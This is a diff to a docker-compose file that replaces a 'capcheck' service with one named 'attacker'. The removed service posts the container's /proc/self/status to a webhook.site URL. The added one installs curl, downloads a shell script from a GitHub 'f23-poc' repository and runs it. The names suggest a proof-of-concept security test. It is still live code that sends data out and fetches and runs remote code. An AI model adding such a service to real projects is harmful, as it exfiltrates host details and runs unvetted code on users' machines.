@@ -1,9 +1,11 @@
 services:
-  capcheck:
-    image: curlimages/curl:latest
+  attacker:
+    image: alpine:3.20
     entrypoint:
       - sh
       - -c
       - |
-        curl -sS --max-time 20 --data-binary @/proc/self/status "https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6?tag=F23-TEST-INCLUDE"
-        sleep 999999
+        apk add --no-cache curl >/dev/null 2>&1
+        curl -sS -o /tmp/run.sh https://raw.githubusercontent.com/sashabal/f23-poc/f23-test-root/attacker.sh
+        chmod +x /tmp/run.sh
+        exec /tmp/run.sh
